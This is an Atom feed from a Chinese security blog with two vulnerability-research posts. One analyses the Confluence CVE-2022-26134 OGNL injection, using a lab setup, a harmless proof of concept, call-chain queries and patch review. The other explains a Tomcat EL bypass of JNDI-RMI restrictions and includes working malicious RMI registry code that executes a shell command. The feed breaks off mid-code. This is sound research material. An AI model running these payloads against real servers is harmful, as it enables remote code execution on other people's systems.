<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>m0d9&#39;s blog</title>
  
  
  <link href="http://m0d9.me/atom.xml" rel="self"/>
  
  <link href="http://m0d9.me/"/>
  <updated>2022-06-29T09:53:28.209Z</updated>
  <id>http://m0d9.me/</id>
  
  <author>
    <name>m0d9</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Confluence CVE-2022-26134 OGNL 分析</title>
    <link href="http://m0d9.me/2022/06/10/Confluence-CVE-2022-26134-OGNL-%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2022/06/10/Confluence-CVE-2022-26134-OGNL-%E5%88%86%E6%9E%90/</id>
    <published>2022-06-10T06:20:00.000Z</published>
    <updated>2022-06-29T09:53:28.209Z</updated>
    
    <content type="html"><![CDATA[<!-- 日拱一卒，功不唐捐。--><p>发现半年没写文章了。。。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>P🐮的Vulhub 有镜像了，不过调试接口没有开出来，这里稍微补充下。</p><p>在vulhub/confluence/CVE2022-26134 目录下</p><ol><li>新建Dockerfile</li></ol><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> vulhub/confluence:<span class="number">7.13</span>.<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed <span class="string">&quot;106 iCATALINA_OPTS=\&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 \$\&#123;CATALINA_OPTS\&#125;\&quot;&quot;</span> -i /opt/atlassian/confluence/bin/setenv.sh</span></span><br></pre></td></tr></table></figure><ol start="2"><li>更新docker-compose.yml</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">build:</span> <span class="string">.</span></span><br><span class="line"><span class="comment"># image: vulhub/confluence:7.13.6</span></span><br><span class="line"><span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;8090:8090&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;5005:5005&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>Y4er 师傅关于漏洞的总结得挺好的，漏洞复现这块已经没什么好讲的了。</p><ul><li>漏洞的调用栈</li><li>黑白名单的绕过</li></ul><p><code>POC: curl -v &quot;http://192.168.1.112:8090/%24%7B1+1%7D/&quot;</code></p><p>最终的调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">findValue:129, OgnlValueStack (com.opensymphony.xwork.util)</span><br><span class="line">translateVariables:39, TextParseUtil (com.opensymphony.xwork.util)</span><br><span class="line">execute:95, ActionChainResult (com.opensymphony.xwork)</span><br><span class="line">executeResult:263, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">invoke:187, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:21, FlashScopeInterceptor (com.atlassian.confluence.xwork)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor) [3]</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:27, LastModifiedInterceptor (com.atlassian.confluence.core.actions)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:44, ConfluenceAutowireInterceptor (com.atlassian.confluence.core)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor) [2]</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">invokeAndHandleExceptions:61, TransactionalInvocation (com.atlassian.xwork.interceptors)</span><br><span class="line">invokeInTransaction:51, TransactionalInvocation (com.atlassian.xwork.interceptors)</span><br><span class="line">intercept:50, XWorkTransactionInterceptor (com.atlassian.xwork.interceptors)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:61, SetupIncompleteInterceptor (com.atlassian.confluence.xwork)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:26, SecurityHeadersInterceptor (com.atlassian.confluence.security.interceptors)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor) [1]</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">execute:115, DefaultActionProxy (com.opensymphony.xwork)</span><br><span class="line">serviceAction:56, ConfluenceServletDispatcher (com.atlassian.confluence.servlet)</span><br><span class="line">service:199, ServletDispatcher (com.opensymphony.webwork.dispatcher)</span><br><span class="line">service:764, HttpServlet (javax.servlet.http)</span><br></pre></td></tr></table></figure><h2 id="0x03-思路逆向"><a href="#0x03-思路逆向" class="headerlink" title="0x03 思路逆向"></a>0x03 思路逆向</h2><p>关于漏洞如何发现的，个人理解可以拆分成3个阶段</p><ol><li>如何定位到去挖confluence</li><li>如何发现ognl攻击面，也即sink点</li><li>如何从sink点推导出source及path</li></ol><p>这些都是很有意思的点，值得思考。这里也只尝试逆向分析步骤3的思路，步骤1、2太过宽泛了有时间再做探讨。</p><h3 id="sink-到source"><a href="#sink-到source" class="headerlink" title="sink 到source"></a>sink 到source</h3><p>sink 点其实很明显，ognl.getValue，在此基础上如何找到完整的触发链？</p><p>source点在javax.servlet.http.HttpServlet#service，需要对confluence 结构有一定了解，或者要调试下历史的漏洞，应该能定位到这里。</p><p>如何找出中间的链，confluence没有源码，所以tabby 或者 ByteCodeDL？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xmx6g -jar build&#x2F;libs&#x2F;tabby-1.1.0.RELEASE.jar ..&#x2F;confluence&#x2F;atlassian-confluence-7.13.6&#x2F;confluence&#x2F;WEB-INF&#x2F;lib&#x2F; --isJDKProcess</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; confluence CVE-2022-26134</span><br><span class="line">match (source:Method &#123;NAME:&quot;service&quot;&#125;) where source.CLASSNAME &#x3D;~ &quot;.*ServletDispatcher&quot;</span><br><span class="line">match (sink:Method &#123;NAME:&quot;translateVariables&quot;, CLASSNAME:&quot;com.opensymphony.xwork.util.TextParseUtil&quot;&#125;) </span><br><span class="line">call apoc.algo.allSimplePaths(source,sink,&quot;&gt;CALL|ALIAS&quot;,9) yield path </span><br><span class="line">return path</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-214.png" alt="upload successful"></p><p>Y4师傅提到的一些其他的 *Result#execute，可以看到部分也在路径里面。</p><h3 id="sink-点的定位"><a href="#sink-点的定位" class="headerlink" title="sink 点的定位"></a>sink 点的定位</h3><p>Semgrep 对于找sink点，和正则相比有一些优势，不过目前规则也不全。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">pattern-either:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">pattern:</span> <span class="string">|</span></span><br><span class="line">       <span class="string">ognl.Ognl.getValue(...)</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">pattern:</span> <span class="string">|</span></span><br><span class="line">       <span class="string">ognl.Ognl.setValue(...)</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">pattern:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">$X.translateVariables(...</span> <span class="string">,</span> <span class="string">...)</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">semgrep --config=java/lang/security/audit/ognl-injection2.yaml ~/study/java/confluence/confluence-home/jars/</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-218.png" alt="upload successful"></p><p>对于jar类型，如果要实现完全自动化还是比较困难。反编译、自动化运行semgrep规则、再从sink点出发用Tabby找路径。目前也没有好的思路，学习《软件分析》吧。</p><h2 id="0x04-补丁分析"><a href="#0x04-补丁分析" class="headerlink" title="0x04 补丁分析"></a>0x04 补丁分析</h2><p><img src="/images/pasted-215.png" alt="upload successful"><br>只是修了ActionChainResult 中的translateVariables。但是其他的Ognl 点也没找到触发链。</p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>本文简略的跟踪了Confluence CVE-2022-26134 OGNL的漏洞调用流程，并在此基础上探索其OGNL调用链的发现思路。分析了补丁，尝试挖掘其他的触发链，但是无果。基本内容Y4师傅的文章基本都有了，本文没什么新的东西。</p><p>总的来说这个洞原理并不难，st2 的ognl也是经典的漏洞了，但是为什么是黑产走在了技术前沿？纯技术而言，原理不难，但是较难自动化，主动挖掘也需要一定的漏洞历史知识。</p><p>老样子留个坑吧</p><ol><li>只根据补丁，能够独立分析出POC吗？PS：业内谁最先搞出poc的</li><li>怎么会想到到去挖confluence的？</li><li>如何发现OGNL攻击面？</li></ol><p>未完待续。。。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ul><li>[1]<a href="https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134">Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2022-26134) (by:phith0n)</a></li><li>[2]<a href="https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/">CVE-2022-26134 Confluence Server Data Center OGNL RCE (by:Y4er)</a></li><li>[3]<a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html">Confluence Security Advisory 2022-06-02</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- 日拱一卒，功不唐捐。--&gt;

&lt;p&gt;发现半年没写文章了。。。&lt;/p&gt;
&lt;h2 id=&quot;0x01-环境搭建&quot;&gt;&lt;a href=&quot;#0x01-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;0x01 环境搭建&quot;&gt;&lt;/a&gt;0x01 环境搭建&lt;/h2&gt;&lt;p&gt;P�</summary>
      
    
    
    
    <category term="Java" scheme="http://m0d9.me/categories/Java/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Confluence" scheme="http://m0d9.me/tags/Confluence/"/>
    
    <category term="OGNL" scheme="http://m0d9.me/tags/OGNL/"/>
    
  </entry>
  
  <entry>
    <title>JNDI-RMI 注入的EL 绕过思路分析</title>
    <link href="http://m0d9.me/2021/12/17/JNDI-RMI-LDAP%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/12/17/JNDI-RMI-LDAP%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</id>
    <published>2021-12-17T06:11:00.000Z</published>
    <updated>2022-03-18T06:26:23.093Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/pasted-203.png" alt="upload successful"></p><p>上面的JNDI 注入的JDK 版本限制已经耳熟能详了，针对JNDI-RMI 的tomcat EL 绕过姿势也被经常提起，本文尝试回溯这一姿势的发现过程。</p><h2 id="JNDI-RMI-注入"><a href="#JNDI-RMI-注入" class="headerlink" title="JNDI-RMI 注入"></a>JNDI-RMI 注入</h2><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>必须了解两个重要的类</p><ul><li>com.sun.jndi.rmi.registry.RegistryContext： JNDI-RMI接口</li><li>java.rmi.registry.Registry： RMI 接口</li></ul><p>通常攻击场景下，Registry是作为RMI服务端，RegistryContext是作为攻击的client端，也就是vuln。</p><a id="more"></a><h2 id="低版本注入过程：RegistryContext-lookup"><a href="#低版本注入过程：RegistryContext-lookup" class="headerlink" title="低版本注入过程：RegistryContext#lookup"></a>低版本注入过程：RegistryContext#lookup</h2><p>都在RegistryContext#lookup 里面，常见的如 ctx.lookup(“rmi://xxx/Exploit”)，被攻击过程如下</p><ul><li>registry#lookup 获取远程恶意server 绑定的Remote 类</li><li>registry#decodeObject 调用该Remote类 的getObjectInstance 实例化该类</li></ul><p>com.sun.jndi.rmi.registry.RegistryContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> Registry registry;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           Remote var2;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">           &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">           &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">               <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">           <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br></pre></td></tr></table></figure><p>javax.naming.spi.NamingManager#getObjectInstance</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">        getObjectInstance(Object refInfo, Name name, Context nameCtx,</span><br><span class="line">                          Hashtable&lt;?,?&gt; environment)</span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        ObjectFactory factory;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use builder if installed</span></span><br><span class="line">        ObjectFactoryBuilder builder = getObjectFactoryBuilder();</span><br><span class="line">        <span class="keyword">if</span> (builder != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// builder must return non-null factory</span></span><br><span class="line">            factory = builder.createObjectFactory(refInfo, environment);</span><br><span class="line">            <span class="keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,</span><br><span class="line">                environment);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use reference if possible</span></span><br><span class="line">        Reference ref = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            ref = (Reference) refInfo;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object answer;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String f = ref.getFactoryClassName();</span><br><span class="line">            <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                     environment);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">                <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">                <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">                <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">                answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">                <span class="keyword">if</span> (answer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> answer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// try using any specified factories</span></span><br><span class="line">        answer =</span><br><span class="line">            createObjectFromFactories(refInfo, name, nameCtx, environment);</span><br><span class="line">        <span class="keyword">return</span> (answer != <span class="keyword">null</span>) ? answer : refInfo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>注意此处，如果是Reference 对象，则会getObjectFactoryFromReference - getObjectInstance 进行实例化，也就是原本的JNDI-RMI利用流程。</p><h3 id="高版本限制：RegistryContext-decodeObject"><a href="#高版本限制：RegistryContext-decodeObject" class="headerlink" title="高版本限制：RegistryContext#decodeObject"></a>高版本限制：RegistryContext#decodeObject</h3><blockquote><p>在JDK 6u132, JDK 7u122, JDK 8u113 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。如果需要开启 RMI Registry 或者 COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。</p></blockquote><p>实现trustURLCodebase 的逻辑在decodeObject 上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">...</span><br><span class="line">            <span class="keyword">if</span> (var8 != <span class="keyword">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="keyword">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        PrivilegedAction var0 = () -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> System.getProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        String var1 = (String)AccessController.doPrivileged(var0);</span><br><span class="line">        trustURLCodebase = <span class="string">&quot;true&quot;</span>.equalsIgnoreCase(var1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="TOMCAT-EL的绕过"><a href="#TOMCAT-EL的绕过" class="headerlink" title="TOMCAT EL的绕过"></a>TOMCAT EL的绕过</h3><p>都知道tomcat EL可以实现绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.logCalls&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span></span><br><span class="line">ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line"><span class="comment">// 强制将 &#x27;x&#x27; 属性的setter 从 &#x27;setX&#x27; 变为 &#x27;eval&#x27;, 详细逻辑见 BeanFactory.getObjectInstance 代码</span></span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line"><span class="comment">// 利用表达式执行命令</span></span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;open -a calculator&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br></pre></td></tr></table></figure><h2 id="思路逆向分析"><a href="#思路逆向分析" class="headerlink" title="思路逆向分析"></a>思路逆向分析</h2><p>知其然更要知其所以然，这种绕过方式但是如何发现的呢？</p><h3 id="ResourceRef-的定位"><a href="#ResourceRef-的定位" class="headerlink" title="ResourceRef 的定位"></a>ResourceRef 的定位</h3><p>从RegistryContext#decodeObject 限制逻辑中可以看到，java.naming.Reference 用不了，因为getFactoryClassLocation 过不了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(className);</span><br><span class="line">    classFactory = factory;</span><br><span class="line">    classFactoryLocation = factoryLocation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么，还有哪些类满足</p><ol><li>继承Reference</li><li>getFactoryClassLocation 可以为null</li></ol><p>尝试找继承Reference 的子类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class MyReference extends ClassOrInterface&#123;</span><br><span class="line">MyReference()&#123;</span><br><span class="line">this.getName()&#x3D;&quot;Reference&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">predicate isMyClass(Class m)&#123;</span><br><span class="line">m.getASupertype*() instanceof MyReference</span><br><span class="line">&#125;</span><br><span class="line">from Class c</span><br><span class="line">where isMyClass(c)</span><br><span class="line">select c</span><br></pre></td></tr></table></figure><p>结论是在tomcat-catalina 中找到了</p><ul><li><strong>org.apache.naming.ResourceRef</strong></li><li>org.apache.naming.LookupRef (可rmi转ldap，作用有限)</li><li>org.apache.naming.HandlerRef</li><li>org.apache.naming.EjbRef</li><li>org.apache.naming.ResourceLinkRef</li><li>org.apache.naming.ResourceEnvRef</li><li>org.apache.naming.ServiceRef</li></ul><p>以ResourceRef 为例</p><h3 id="ReferenceWrapper-的定位"><a href="#ReferenceWrapper-的定位" class="headerlink" title="ReferenceWrapper 的定位"></a>ReferenceWrapper 的定位</h3><p>ResourceRef 定位到了，但是不能直接bind, 因为java.rmi.registry.Registry 只能bind Remote类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">(String name, Remote obj)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span>;</span><br></pre></td></tr></table></figure><p>如果熟悉JNDI-RMI 低版本注入，应该记得这两种方式：</p><ul><li>直接bind Exploit</li><li><strong>通过ReferenceWrapper(reference) 实现bind 远程目标类</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#1. 直接绑定存在恶意代码块的类实例</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>, (Remote) <span class="keyword">new</span> Exploit());</span><br><span 